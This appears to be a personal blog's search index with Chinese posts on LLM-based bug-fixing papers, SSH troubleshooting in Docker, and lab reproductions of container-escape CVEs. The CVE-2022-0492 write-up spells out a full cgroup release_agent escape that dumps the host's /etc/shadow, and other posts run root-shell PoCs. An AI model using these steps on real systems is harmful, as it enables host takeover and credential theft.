[{"title":"Hello World","path":"/2024/07/5763d6385f42.html","content":"Welcome to Hexo ! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub . Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment"},{"title":"to-read-a-paper","path":"/2024/05/12708528a95e.html","content":"Cited by https://www.zhihu.com/question/345516318/answer/2236474930 And https://www.jianshu.com/p/427b4c2e6c35 论文的搜集新接触一个领域时，先把和题目可能相关的论文搜集三十到四十篇，每一篇都只读Abstract和Intro，必要时读一下Ilustrative examples 和Conclusions，筛选出最相关的五篇论文，并判断有无继续读完的价值。阅读完成后，回答下面的问题： 在这领域内最常被引述的方法有哪些? 这些方法可以分成哪些主要类别? 每个类别共同的主要优缺点（Pros/Cons）是什么？ 这些论文的搜集可以在Review paper中看到，从数篇相关的review开始找出题目相对相关的30~40篇。可以反复读abstract和intro，每一次完成不同的任务。 Abstract&amp;Intro确定该领域内的主要方法之后（问题1），根据2的答案将其分类，每个派别按日期先后次序排好，并根据阅读结果修正论文集合，只保留大概20篇左右确定跟你关系较近的文献。然后按照时间顺序重读abstract和intro，这时候回答一个问题： 这一派的主要idea和主要目标是什么？ 阅读完后总结出这一派主要的诉求、 方法特色和优点(每一篇论文都会说出自己的优点，仔细读就不会漏掉)就可以拿到问题3，4的答案。 然后再过一遍论文的intro，在prior works里找到对于其他派别的论文的缺点的评论，分类记录。 利用问题3的答案回答： 这个领域内大家认为重要的关键问题有哪些?有哪些特性是大家重视的优点?有哪些特性是大家在意的缺点?这些优点与缺点通常在哪些应用场合时会比较被重视?在哪些应用场合时比较不会被重视? 然后可以整理出这个领域的主要应用场景，以及每个场景的特点和对解决方案的要求。 在下一步之前整理各个派别分类的论文在文件夹里，并按照时间先后排序。接下来按照派别的相关程度逐一阅读main bodies。 Main body第一次看main body时需要解决： 这篇论文在什么条件下有效，并且该条件在现实中是否容易达成 在该条件和假设下该论文提供了什么样的优势 这些优势体现在什么方面 在你开始根据前述问题念论文之前，你应该先把这派别所有的论文都拿出来，逐篇粗略地浏览过去(不要勉强自己每篇或每行都弄到懂，而是轻松地读，能懂就懂，不懂就不懂)，从中挑出容易念懂的papers ，以及经常被引述的论文。然后把这些论文照时间先后次序依序念下去。记得:你念的时候只要回答6、7、8三个问题就好，不要念太细。这样念完以后，你应该把这一派的主要发展过程，主要假设、主要理论依据、以及主要的成果做一个完整的整理。其次，你还要在根据5的答案以及这一派的主要假设，进一步回答下一个问题: 这一派最适合什么时候使用，最不适合什么场合使用。 在做评估时通常会参考论文给出的example,但这可能是作者精心挑选/构造的example,可能具有一定误导性.这时候应当回到方法的基本假设和场景中,参考问题4和5考虑:当基本假设不成立的时候,这些方法会出现什么问题?这个方法在什么场景表现好,什么场景出现问题?然后再去检查experiment中给出的场景是否规避了缺点,强调了优点. 必须学会选择性的阅读，而且必须锻炼出他选择时的准确度以及选择的速度，不要浪费时间在学用不着的细节知识!多吸收idea比较重要，而不是细部的知识。 方法没有好坏，只有相对优缺点:只有当方法的特性与应用场合的特性不合时，才能下结论说这方法「不适用」;二当方法的特性与应用场合的特性吻合时，则下结论说这方法「很适用」。因此，一定要同时有方法特性表与应用场合特性分析表放在一起后，才能判断一个方法的适用性。 Extra 硕士生开始学读期刊论文时，就容易犯的毛病就是戒除不掉大学部的习惯:(1)老是想逐行读懂，有一行读不懂就受不了。(2) 不敢发挥自己的想象，读论文像在读教科书，论文没写的就不会，瘫痪在那里;被我逼着去自己猜测或想象时，老怕弄错作者的意思，神经绷紧，脑筋根本动不了。 每次读论文都要带着问题读,每次读目标都只是回答要回答的问题,所以一定是选择性阅读,由粗到细逐步了解 对于一类论文,一定是一整批一起读懂到某个层次，而不是逐篇逐篇地整篇一次读懂。 绝大部分论文应当了解主要观念而不是详细实现过程 我读论文远比学生快，分析远比学生深入，主要的是我敢想象与猜测，而且多年训练下来想象与猜测的准确度很高。所以，许多论文我根本不是「读懂」的，而是「猜对」了! 在阅读的时候保持猜测,并在论文中找证据 猜对了，就用你的猜测(其实是你的推理架构)去吸收作者的资讯与创意(这会比从头硬生生地去迁就作者的思路轻松而容易) 猜错了，论文理会有一些信息告诉你说你错了，而且因为猜错所以你读到对的答案时反而印象更深刻。 To report论文的报告(ppt)需要有下面的部分: 论文的基本信息:题目、作者、pub、年份 每个ppt只讲一个概念 说明论文研究的重点,和工业界有什么应用相关 论文的主要假设,主要公式,主要应用方式 论文的evaluation,以及在不同场合的使用程度 个人评价 主要的idea? 这些idea在应用上有什么优势? 这些优势需要什么条件才能成立? 论文的主要limitation是什么? 这些缺点导致哪些场景带来什么缺陷? 这些缺陷是因为设计中的什么因素引入的? 可以参考论文中的哪些idea? 读论文和报告论文时，最重要的是它的idea和观念架构，而不是数学上恒等式推导过程的细节(顶多只要抓出关键的equation去弄懂以及说明清楚即可)","tags":["papers"],"categories":["MISC"]},{"title":"A Unified Debugging Approach via LLM-Based Multi-Agent Synergy","path":"/2024/05/2cebcecbcb87.html","content":"A Unified Debugging Approach via LLM-Based Multi-Agent SynergyInfo Pub: Arxiv Authors: Cheryl Lee, Chunqiu Steven Xia, Jen-tse Huang, Zhouruixin Zhu, Lingming Zhang, Michael R. Lyu Institutions: CUHK, University of Illinois Urbana-Champaign Repo: Not yet Abstract 自动化软件测试 基于LLM的调试工具的挑战 上游故障定位影响下游修复 处理复杂逻辑错误的不足 忽略程序的上下文 通用的协同化debug框架 LLM可以从一般软件工程原则(rubber duck)受益 克服了过拟合问题 IntroThreat model 可能存在bug的程序 知道该程序的功能 工具（LLM）生成plausible的patch尝试修复bug Pervious worksdebug的两个步骤 Fault Localization Automated Program RepairFL分析测试输出以定位问题-静态/突变分析-高度依赖人工测试用例APR通过预定义的debug模式或符号执行-基于人工用例-搜索空间有限,在跨编程语言转换时需要重新实现修复模式基于学习的FL基于源代码,执行特点和测试结果定位bug基于学习的APR使用神经机器翻译MMT将有缺陷的代码翻译为修复基于LLM的FL和APR基于学习/LLM的debug具有下面的挑战: 不完美的FL 现有工作都假设FL工具能够准确定位bug位置,但不能完全满足 复杂的逻辑漏洞对于依赖模式识别的LLM模型,具有复杂逻辑的漏洞可能比小型模型差 缺少上下文大部分LLM都是在文件级别的源代码训练的缺少分析文件之间的函数和代码依赖关系的能力忽略了变量范围,函数定义和外部库等 Contribution提出FixAgent:通过LLM多智能体协同的第一个统一、自动化的调试框架 Agent协同:每个Agent用rubber方法详细解释步骤 中间变量跟踪:显式跟踪错误程序中的关键变量,并讨论如何指导任务完成.rubber不需要逐行解释以节省context 程序上下文构建:根据规范和描述和依赖关系构建上下文,并和错误程序一起提供,同时指示Agent对上下文有更多的关注 MotivationsFault location(FL) FL工具会报FP-不必要的修补-引入新的bug 完美的FL不存在 FL工具会报FN-大多数FL+APR假定每个程序只包含一个bug 识别涉及多行的bug具有挑战性 APR工具依赖于插桩FL，只能检测出单行bug 依赖于测试用例的FL无法识别“xx不存在”的错误，real world的bug复杂多样需要更多的定位调试 Fixing 目前的LLM可以完成debug 可以在没有先验知识的情况下修复有缺陷的程序 在修复逻辑bug上存在困难 可以顺利运行但WA 逻辑的漏洞超出了LLM的理解力，因此需要更好的释放能力的设计 Context 现有的APR只关心源代码和测试结果，忽略了上下文 Design FL：识别错误的代码语句，并标记在错误程序中 APR：生成一个patch Reviewer/Revisitor：分析检查为什么原代码是有问题的 每个agent具有独立的中间变量追踪和构建后的程序context Crafter：生成人工测试用例以外的测试输入以避免过拟合 流式工作，每个agent接收upstream的信息并传给downstream Prompt每个Agent的prompt包含一个三元组 角色设定：角色的描述和任务目标 程序规范：错误程序、失败的测试用例、程序上下文和前一个Agent的信息 任务指令：给出的执行步骤和详细说明 中间变量跟踪-改进版的rubber duck 提示每一个Agent跟踪关键的中间变量，并和预期结果进行比较 在resp中明确进行跟踪，并解释推导 改进版的rubber不是逐行解释而是专注于核心逻辑和重要状态 分解复杂问题为简单问题，并且提高推理能力 增强了决策的透明度以增强可读性 核心：将一个多逻辑模块的复杂程序分解为多个中间状态 上下文构建主要集中在两种信息： 需求 依赖关系 程序需求如果具有详细文档，则通过下面的方式描述预期行为 程序功能 输入/输出 精度要求和其他信息 如果没有文档但实现的功能（算法）是众所周知的：请求一个通用LLM对该算法给出描述。 依赖关系解析程序的依赖关系并且提取依赖文件的代码，并放在程序顶部.这样LLM可以先看依赖代码再看错误程序,并且可以为程序构建上下文. 其他测试输入生成(crafter)单独设立一个Agent作为crafter当一个可能正确的测试用例生成后，这里根据人类编写的测试用例迁移生成新的测试样例,以避免LLM的过拟合.这里同样使用profile-spec-instruction做promptprompt包含一些测试用例，帮助llm更好执行新任务prompt要求crafter考虑和示例不同的测试用例，特别考虑： 语义缺陷 边界值 重复输入 边缘情况 crafter还需要解释测试用例的基本原理 引导crafter挖掘多样化的输入和长测试输入 长测试输入被llm限制：使用缩写表示长测试输入 由于LLM不能很好解决算术问题，需要用外部方式计算输入的预期输出。 Feedback Re-sampling如果生成了错误的补丁，则重新反馈到第一步FL生成另一个补丁。对于反馈context包含的数量有一个上限m，只保留最近m个失败的sample 考虑一个场景，假设最多允许个sample，目标是修复程序。此前已经有个补丁提出，分别为其中为通过测试数量最多的失败补丁为了生成，将和对应的错误信息放进prompt的spec部分最终的spec包含在通过m次(max_retry)或者patch通过所有测试后，输出为最终解决方案 EvualationSetupFrameworkFixAgent在公共数据集上进行比较指标: 正确patch的数量 plausible的补丁数量Dataset Codeflaws:3902错误程序(2952一行错误),C language,没有给出patch QuixBugs:40个包含单行错误的经典算法 Java/Python ConDefects: 1254个Java和1625个PythonConDefect是最近的,因此不可能作为LLM的语料 Baseline10 APR和6 LLM或许可以加上一些国产的大模型? Implementation 在Base LLM部分,变量跟踪提示转化为“think step by step” Base LLM 包含了程序规范 LLM设置 p=1.0 temperature=1 每个LLM baseline只生成最多3个补丁(m=3) 只有给出的补丁结果语义上等同数据集给出的补丁,才认为是正确的 对于Quix生成的结果进行手动检查,但Codeflaw没有给出patch,因此只给出正确率 生成补丁数量太多 没有给出bug位置,LLM会倾向于重写代码 RQ1 和SOTA的APR工具比较 和基本的LLM比较 不同编程语言的比较 baseline FL的分类 标准FL:传统的基于频谱的FL 完美FL:假设APR工具知道真实的错误位置在软件工程和自动程序修复（APR）领域中，”标准FL”（Standard Fault Localization）和”完美的FL”（Perfect Fault Localization）是评估自动修复工具性能时常用的两种错误定位技术。 完美的故障定位（Perfect Fault Localization）: 定义：完美的故障定位是一种理想化的错误定位方法，假设我们已经精确地知道了代码中错误发生的具体位置。这种情况下，错误定位技术能够直接指向导致测试失败的确切代码行或代码块。 优势：提供了一种最佳情况下的评估环境，可以用来测试APR工具在已知错误位置时的修复能力，从而评估其修复技术的效果。 用途：在研究中，完美的FL常用于基准测试，帮助研究者理解在理想条件下，修复工具的潜力和性能极限。 标准的故障定位（Standard Fault Localization）: 定义：标凘的故障定位是指在真实场景中使用的故障定位方法，这些方法通过分析程序执行的测试用例（包括通过和失败的测试）来推断可能的错误位置。常见的技术包括谱系错误定位（Spectrum-based Fault Localization, SFL），它通过统计代码在失败和成功的测试用例中执行的频率来推测错误位置。 优势：更接近实际应用的场景，可以提供关于APR工具在处理实际错误时的实用性和效果的信息。 用途：在实际的软件开发和自动修复研究中，标准FL是更常见的选择，因为它能够模拟修复工具在面对真实世界错误时的表现。区别： 准确性：完美的FL提供了错误位置的准确信息，而标准的FL的准确性取决于使用的具体技术和测试用例的质量。 应用场景：完美的FL通常用于理论研究和基准测试，以评估APR方法的理论性能；标准的FL则更多用于评估工具在实际应用中的表现。 实用性：在真实世界的软件开发中，很少能获得完美的FL信息，因此标准的FL在实际应用中更为常见和实用。结果 Codeflaw上FixAgent显著优于其他APR和LLM QuixBug优于所有的方法 Java修复了39/40 Python修复了All LLM在不知道bug位置的情况下也能表现出很强的效果,而APR通常需要完美FL的假设或者FL工具 Codeflaw这种对于上下文和语义的理解要求更高,因此FixAgent的效果更突出 由于FixAgent关注关键变量中间值,使得问题在最终输出前就被关注和发现 RQ2使用ConDefect检查FixAgent使用不同的LLM的比较使用FixAgent对于Raw LLM有20%的改进,而且是非侵入式 RQ3衡量每个Agent对FixAgent的贡献,以及如果移除了该Agent,对于效果的影响结果:context对于Fix的影响最重要,提供了底层问题域和推断功能的潜力结论:传统的 CoT 提示虽然在鼓励逐步推理方面是有效的，但并没有以最小化推理应变的方式固有地优先考虑信息。相反，我们的策略简化了llm分析程序逻辑的过程。使用一个代理来替换多智能体协同具有相似的负面影响，这减少了 28 个合理和正确的修复。劳动分工反映了软件中公认的原则：专业化，迫使每个代理专注于自己的任务并减少认知负荷。 DiscussionLimitation FixAgent显著依赖Base LLM的性能和能力,只是在Base基础上更好发挥能力,而不能代替LLM做决策 LLM存在概率问题,在引入的外部的计算测试用例的输出的Agent中不能保证准确输出期望值.解决类似于数学推理的问题代表了llm面临的重大挑战之一。我们的方法无法克服其固有的局限性；因此，必须引入附加信息，例如正确代码或手动计算的答案，以获得生成输入的输出并形成完整的测试用例。 ValidityLLM内可能阅读过数据集的知识,具有先验缓解方式: 选用最近最新的数据集 使用不太可能作为LLM的训练集的一部分 和Raw LLM做比较体现出优势 Conclusion我们提出了FixAgent，这是第一个通过LLM代理协同的统一调试框架。它以端到端的方式进行故障定位、补丁生成和错误后分析。我们的见解是 LLM 可以从开发人员识别的软件工程原则中受益。因此，我们遵循橡胶鸭调试的原理，详细解释代码，创建新的设计，释放llm的调试能力，减轻以前的挑战。对两个广泛使用的数据集的评估证明了FixAgent相对于APR工具和基于LLM的竞争对手的优越性，对最近收集的数据(避免数据泄漏)的额外实验进一步表明，与基本llm相比，我们在调试方面的泛化和有效性。我们的代码和生成的补丁是公开的，以供进一步研究和复制 Resourcehttps://github.com/iridium-soda/Paper_slides/blob/main/A%20Unified%20Debugging%20Approach%20via%20LLM-Based%20Multi-Agent%20Synergy.key","tags":["LLM"],"categories":["Papers Read"]},{"title":"Keep the Conversation Going: Fixing 162 out of 337 bugs for 0.42 each using ChatGPT","path":"/2024/05/337c7d251c25.html","content":"Keep the Conversation Going: Fixing 162 out of 337 bugs for $0.42 each using ChatGPTInfo Pub: Arxiv Authors: Chunqiu Steven Xia, Lingming Zhang Institutions: University of Illinois Urbana-Champaign Repo: Not yet Abstract 自动程序修复技术APR 使用LLM做APR 传统G&amp;V方式从同一prompt生成大量patch逐一测试,效果不好 提出: 对话驱动的APR 提供测试故障信息 收集错误的补丁作为下一轮的prompy 效果: 实现了正确的修复 成本较低 IntroTraditional works传统的APR技术 基于模板 基于启发式 基于约束基于学习的APR技术 基于神经机器翻译:使用历史补丁修复数据集训练模型 缺陷:包含无效数据、没有推广 基于LLM 填空式给出补丁 LLM的APR应用完成单个正确行或者固定函数 缺陷: 忽视了测试失败的信息(e.g. Expect … But was: …) 重复抽样:多轮修复是独立的,LLM可能会重复生成同样错误的补丁 忽略了有价值的patch:部分patch包含了部分合理的信息 Contributions ChatRepair 使用报错信息作为初始prompt,提供更多上下文 对于未通过的patch,结合错误的patch和报错,为LLM构建一个新prompt 对于通过的(似是而非的)patch,要求llm生成替代变体 目标生成更合理的补丁 结果:成本更低 我们提出ChatRepair——第一个全自动对话驱动的APR工具，它利用新开发的ChatGPT模型来执行修复。ChatRepair从之前不正确和合理的补丁中学习，并利用测试失败信息向模型提供即时和动态的反馈，以生成新的补丁。通过我们的会话修复范例，ChatRepair能够分别在缺陷4j 1.2和2.0上实现114和48个bug的最新性能(比最佳性能基线多15和17个)。 Design 提供了有价值的测试报错信息 基于连续对话,而不是单一prompt反复发送(context包含对话上下文) 使用GPT You are an Automated Program Repair tool Construct initial prompt Conversation 评估能否通过之前的测试 如果不能-创建一个响应(包括故障信息)重新生成 直到产生初步可用的补丁或者token excceed Plausible 使用生成似是而非的补丁prompt 以生成更多的合理补丁,增加正确补丁的机会 Initial 关注代码行级填空修复 在prompt前添加之前的修复记录(这里能否将成功的patch放在这里用于下一个修复任务) Conversation 固定的context window-有限的重试次数 Not finished yet","tags":["LLM"],"categories":["Papers"]},{"title":"Linux容器使用公钥SSH登录失败排障","path":"/2024/05/97b6d5bdf3be.html","content":"Background由于学校服务器的安全限制,只给了一个一般用户的账号,需要自己创建容器在里面跑程序.在创建好容器(基于Ubuntu24.04)并配置好环境后,发现不能用pubkey连接上ssh,定位排查问题花了很多时间,所以简单记录一下. Docker环境配置Docker创建首先用下面的命令模板创建docker: 1docker run -p [port]:22 --ipc=host --restart always --name CONTAINERNAME --mount type=bind,source=[src_dir],target=/root -itd ubuntu:24.04 /bin/bash 其中port为映射到22端口的host端口,用于ssh连接.src_dir为host上的目录,用于挂载持久化. Docker依赖安装由于需要在docker内运行全量程序,需要将其当做一个完全的虚拟机使用.而ubuntu镜像是经过裁剪的最小化os,所以需要恢复. 首先调整一下apt源.由于是教育网,这里使用清华源.另外ubuntu24.04开始apt文件的位置出现了变化,具体参见清华镜像站说明 .这里并不是直接使用镜像站提供的内容由于TLS一些奇怪的原因,apt并不能使用HTTPS,需要进行修改,可以复制下面的内容,也可以访问Github 获取. 12345678910111213141516171819202122232425262728293031323334353637383940414243# Tsinghua source list copy from https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/# Change https to prevent certificate error. Modified by LouisLiu# Should be placed at /etc/apt/sources.list.d/ubuntu.sourcesTypes: debURIs: http://mirrors.tuna.tsinghua.edu.cn/ubuntuSuites: noble noble-updates noble-backportsComponents: main restricted universe multiverseSigned-By: /usr/share/keyrings/ubuntu-archive-keyring.gpg# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释# Types: deb-src# URIs: https://mirrors.tuna.tsinghua.edu.cn/ubuntu# Suites: noble noble-updates noble-backports# Components: main restricted universe multiverse# Signed-By: /usr/share/keyrings/ubuntu-archive-keyring.gpg# 以下安全更新软件源包含了官方源与镜像站配置，如有需要可自行修改注释切换Types: debURIs: http://security.ubuntu.com/ubuntu/Suites: noble-securityComponents: main restricted universe multiverseSigned-By: /usr/share/keyrings/ubuntu-archive-keyring.gpg# Types: deb-src# URIs: http://security.ubuntu.com/ubuntu/# Suites: noble-security# Components: main restricted universe multiverse# Signed-By: /usr/share/keyrings/ubuntu-archive-keyring.gpg# 预发布软件源，不建议启用# Types: deb# URIs: https://mirrors.tuna.tsinghua.edu.cn/ubuntu# Suites: noble-proposed# Components: main restricted universe multiverse# Signed-By: /usr/share/keyrings/ubuntu-archive-keyring.gpg# # Types: deb-src# # URIs: https://mirrors.tuna.tsinghua.edu.cn/ubuntu# # Suites: noble-proposed# # Components: main restricted universe multiverse# # Signed-By: /usr/share/keyrings/ubuntu-archive-keyring.gpg apt update确认修改完成,安装一些个人需要的基本组件: 1apt intall -y neofetch vim git 随后输入unminimize并选择y恢复完整的ubuntu. 安装和配置SSH安装ssh 12apt install -y openssh-serverservice ssh restart 之后配置/etc/ssh/sshd_config.主要注意以下几点,也可以直接在这里GitHub 下载覆盖: PubkeyAuthentication yes AuthorizedKeysFile .ssh/authorized_keys .ssh/authorized_keys2 导入公钥 1echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6Ra1gfqSqRrgNlJLA4e2yktGT7LUlxM9y5z28sGW2fAAXWqmH8V7OpIQLi+MAaTM67P10JfeRIITFsq/sCJgpJ0I0OQZA7xWS87gruocIo1ko9dDz2wlss+tB1U3AMqyIIS65xe6pL4zJOzS+ty3vnkRwYRUksosLUQz+hqR7QLZSo2FiK/AGDCORR0TwMlGimuujoeOn2qGRI0tfB+acWnEmSgs9ntxuTMvXqSKHY+xrp8N9SxjgNuoGy/z47UpjT45Wk+b6fSh1qBNCfLYsIEuLTamlBpJprGlFNQ8nlPpoDw/bJoR6o90c+W3ewlsqyft2rHKH3OmbuJ4fmkzRlkd84rOTsweUBYQxeWQSQ17IkbCJM34Ndx+peM4iO0K6azfYCA3uCzMFwlL7AELs0EoVES6ej59d1xntXFosHZH/K4FTurPmFezS8mqonKg8umiP8YwqPwBlF45MyEQ98dqSPmop5zKd/rhKAbT8AB4ZAPNcmEWbG+31pWX5pwM= louisliu@Louiss-MacBook-Air.local\"&gt;~/.ssh/authorized_keys 重启ssh服务 1service ssh restart 理论上这时候可以通过host暴露的端口连接了.但是在这里出了问题. 问题出现和定位在连接SSH时,公钥并没有生效,而是直接请求口令.这显然不是我们想要的.使用verbose模式(-vvvT)检查客户端侧的日志,没有显著结果,但定位到了异常位置: 12345678910debug1: Offering public key: /Users/louisliu/.ssh/macAirPrivate RSA SHA256:7EG2Q7bIkZjoWWZdQ8JFYo5jUHLD8cd8ZxbB7ChLyh8 explicitdebug3: send packet: type 50debug2: we sent a publickey packet, wait for replydebug3: receive packet: type 51debug1: Authentications that can continue: publickey,passworddebug2: we did not send a packet, disable methoddebug3: authmethod_lookup passworddebug3: remaining preferred: ,passworddebug3: authmethod_is_enabled passworddebug1: Next authentication method: password server侧的/etc/log/下均为得到日志信息. 这里报Type51,查询得到对应SSH_MSG_USERAUTH_FAILURE: 123456789101112131415161718192021222324http://www.snailbook.com/docs/assigned-numbers.txt4.1.2. Initial Assignments Message ID Value Reference ----------- ----- --------- SSH_MSG_USERAUTH_REQUEST 50 [SSH-USERAUTH] SSH_MSG_USERAUTH_FAILURE 51 [SSH-USERAUTH]http://www.snailbook.com/docs/userauth.txt6. Authentication Protocol Message Numbers These are the general authentication message codes: SSH_MSG_USERAUTH_REQUEST 50 SSH_MSG_USERAUTH_FAILURE 51 SSH_MSG_USERAUTH_SUCCESS 52 SSH_MSG_USERAUTH_BANNER 537. Public Key Authentication Method: \"publickey\" The following method-specific message numbers are used by the \"publickey\" authentication method. SSH_MSG_USERAUTH_PK_OK 60 根据网上的信息,这时候排查几个点: 公钥是否正确导入 私钥是否正确指定 .ssh目录和里面的文件是否权限设置正确.根据参考 的说法: .ssh目录的权限为700 .ssh/authorized_keys文件权限为600 用户目录权限为755或700 排查了一会没有发现问题,提供的日志也不足够排查问题,网上的各种方案都尝试过了.这时候看到参考 的方案: 关闭ssh服务service ssh stop 手动运行ssh/usr/sbin/sshd -d 在server侧看到了下面的日志 123456789debug1: trying public key file /root/.ssh/authorized_keysdebug1: fd 3 clearing O_NONBLOCKAuthentication refused: bad ownership or modes for directory /rootdebug1: restore_uid: 0/0debug1: temporarily_use_uid: 0/0 (e=0/0)debug1: trying public key file /root/.ssh/authorized_keys2debug1: Could not open user 'root' authorized keys '/root/.ssh/authorized_keys2': No such file or directorydebug1: restore_uid: 0/0Failed publickey for root from [IP] port 53162 ssh2: RSA SHA256:7EG2Q7bIkZjoWWZdQ8JFYo5jUHLD8cd8ZxbB7ChLyh8 问题很明显了,是root目录权限的问题导致的,并且导致authorized_keys无法访问. 问题修复1chmod 755 /root 然后重新尝试连接,连接成功. 思考考虑问题背后的原因.由于在容器创建时为了持久化存储,避免容器爆炸导致数据全部丢失,将host上的文件夹挂载为了容器内的root,而host上的用户是normal usergroup,因此该文件夹的权限是有问题的,即不属于上述正常的权限中的任何一种.下面的对于挂载目录的测试可以验证: 123456789 ls -ltotal 28drwxrwxr-x 2 user user 4096 May 23 10:18 base_devdrwxr-xr-x 5 root user 4096 May 31 00:47 cadetsdrwx------ 8 root user 4096 May 30 17:13 fixagentdrwxrwxr-x 2 root user 4096 May 23 11:30 fixagent-devdrwxrwxr-x 2 user user 4096 May 31 00:53 permissiontest-rw-r--r-- 1 user user 1649 May 30 23:25 ssh_config-rw-r--r-- 1 user user 3236 May 30 23:25 sshd_config 可以看到由host创建的目录如果没有修改(permissiontest),权限为775,对于sshd来说过于open,所以导致错误.而修改后的目录(cadets)权限为755,这样可以满足要求. 继续考虑原因.由于容器内部是以root用户运行的,因此内部的root是和host上的root被认为是一回事——而其用户目录(/root/)是由normal user创建的并且挂载到内部覆盖了镜像自动创建的用户目录,所以出现了权限问题,而如果是没有挂载的默认情况应该不会出现,这涉及到docker容器的user namespace机制. 以及还是要多想办法看日志才能确定问题,否则就会陷入到盲人摸象的困境里.长期计划做一个自动化的脚本或者基于ubuntu做一个镜像,从而不需要手动做这么多事情.(但即使镜像设定好了,挂载的时候还是会覆盖掉啊) 后日谈后来在实践过程中发现了上文的一些错误和不完善的地方。因此后来修改了一个脚本，托管在GitLab 上（因为GitHub有时候会连不上443）。创建了一个全新的容器之后，执行下面的命令。目前只支持22.04和24.04.注意脚本里面的pubkey需要替换成自己的 1234567apt update &amp;&amp; apt install -y wgetwget https://gitlab.com/-/snippets/3723520/raw/main/init_22.04.sh # For 22.04# Orwget https://gitlab.com/-/snippets/3723520/raw/main/init_24.04.sh # For 24.04# Modify ssh pubkey at L27source init_22.04.sh # Or 24.04.sh","tags":["Docker","Linux","SSH"],"categories":["踩坑记录"]},{"title":"CVE-2022-0847 复现writeup","path":"/2024/04/f4e70fb0eb58.html","content":"NOTE For all exploit source code and more detailed information, see https://github.com/iridium-soda/container-escape-exploits . 漏洞原理参考 参考 环境要求 OS: Ubuntu 20.04.6 LTS x Kernel: 5.8.0-23-generi Docker: Any 环境安装1./metarget cnv install cve-2022-0847 --verbose 拉取镜像 1sudo docker run -it --rm --name=0847 iridium191/cve-2022-0847:latest /bin/bash Exploit进入容器之后 1./poc `which su` 1234567ubuntu@test:~$ ./poc `which su`[+] hijacking suid binary..[+] dropping suid shell..[+] restoring suid binary..[+] popping root shell.. (dont forget to clean up /tmp/sh ;))# whoamiroot","tags":["LinuxKernel"],"categories":["CVEs","Writeup"]},{"title":"CVE-2022-0492 复现writeup","path":"/2024/04/aee7ce293157.html","content":"NOTE For all exploit source code and more detailed information, see https://github.com/iridium-soda/container-escape-exploits . 漏洞原理参考 参考 环境要求 Ubuntu 20.04.6LTS Linux Kernel 5.8.0-23-generic Docker Any metarget 环境搭建1sudo ./metarget cnv install cve-2022-0492 --verbose 涉及到切换内核，所以需要reboot 构建漏洞容器 1sudo docker run --rm -it --cap-add=SYS_ADMIN --security-opt=\"apparmor=unconfined\" ubuntu:20.04 /bin/bash Ubuntu23.10安装这个内核会导致虚拟机爆炸。所以最好在Ubuntu20.04下安装 Exploit挂载cgroup 12345mkdir /tmp/testcgroupmount -t cgroup -o memory cgroup /tmp/testcgroupmkdir /tmp/testcgroup/xhost_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`echo 1 &gt; /tmp/testcgroup/x/notify_on_release 创建命令执行文件，在release-agent触发的时候执行,在第三行写需要在host中执行的命令 12345touch /cmdecho '#!/bin/sh' &gt; /cmdecho \"lsns &gt;&gt; $host_path/result\" &gt;&gt; /cmdecho \"neofetch&gt;&gt;$host_path/result\" &gt;&gt; /cmdchmod 777 /cmd 修改release_agent ，指向 cmd 文件在宿主机中的路径 1echo \"$host_path/cmd\" &gt; /tmp/testcgroup/release_agent 接下来向 x cgroup 节点中输入一个任务，将自己所属的 sh 的pid 写入 cgroup.procs 1sh -c \"echo \\$\\$ &gt; /tmp/testcgroup/x/cgroup.procs\" sh 命令只执行了一个 echo 指令，一瞬间就会结束，那么 x cgroup 节点中就 / 没有任何任务了，触发 notify_on_release 执行 release_agent 指向的 /cmd 文件，内核触发，在容器外执行我们指定的命令，完成逃逸，逃逸成功。 接下来进/result查看命令执行结果 Shell1234567891011mkdir /tmp/testcgroupmount -t cgroup -o memory cgroup /tmp/testcgroupmkdir /tmp/testcgroup/xhost_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`echo 1 &gt; /tmp/testcgroup/x/notify_on_releasetouch /cmdecho '#!/bin/sh' &gt; /cmdecho \"cat /etc/shadow &gt;&gt; $host_path/result\" &gt;&gt; /cmdchmod 777 /cmdecho \"$host_path/cmd\" &gt; /tmp/testcgroup/release_agentsh -c \"echo \\$\\$ &gt; /tmp/testcgroup/x/cgroup.procs\"cat /result","tags":["LinuxKernel"],"categories":["CVEs","Writeup"]},{"title":"CVE-2022-0185 复现writeup","path":"/2024/04/343c2d2fd083.html","content":"NOTE For all exploit source code and more detailed information, see https://github.com/iridium-soda/container-escape-exploits . 漏洞原理参考 环境要求 Ubuntu20.04 metarget Docker Any 环境搭建安装环境 1./metarget cnv install cve-2022-0185 --verbose 拉取镜像 1sudo docker run -it --rm --name=0185 --cap-add=SYS_ADMIN iridium191/cve-2022-0185:latest /bin/bash Exploit会发现进去的是一般用户normaluser 运行exp 1./expolit","tags":["LinuxKernel"],"categories":["CVEs","Writeup"]},{"title":"CVE-2019-14271 复现writeup","path":"/2024/04/f2a6aa1a36ec.html","content":"NOTE For all exploit source code and more detailed information, see https://github.com/iridium-soda/container-escape-exploits . 漏洞原理参考 环境要求 Ubuntu 18.04 Docker 23.01 环境准备1./metarget cnv install cve-2019-14271 拉取镜像 12sudo docker pull iridium191/cve-2019-14271sudo docker run -it --rm --name=14271 iridium191/cve-2019-14271 /bin/bash Exploit在容器内 1mv /libnss_files.so.2 /lib/x86_64-linux-gnu/ 在容器外 1sudo docker cp 14271:/logs ./ 容器内的log即挂载了host的文件系统","tags":["Docker"],"categories":["CVEs","Writeup"]},{"title":"CVE-2018-18955 复现writeup","path":"/2024/04/a1808592721f.html","content":"NOTE For all exploit source code and more detailed information, see https://github.com/iridium-soda/container-escape-exploits . 漏洞原理在4.19.2之前的Linux内核4.15.x到4.19.x中，kernel/user_namespace.c中的map_write()允许提权，因为它错误地处理了具有超过5个UID或GID范围的嵌套用户命名空间。在受影响的用户命名空间中拥有CAP_SYS_ADMIN的用户可以绕过对命名空间外资源的访问控制，如read /etc/shadow。发生这种情况是因为ID转换对命名空间到内核方向正确进行，而不是对内核到命名空间方向进行。 注意:该漏洞并未绕过namespace的限制,只能实现容器内一般用户提权 参考 环境准备 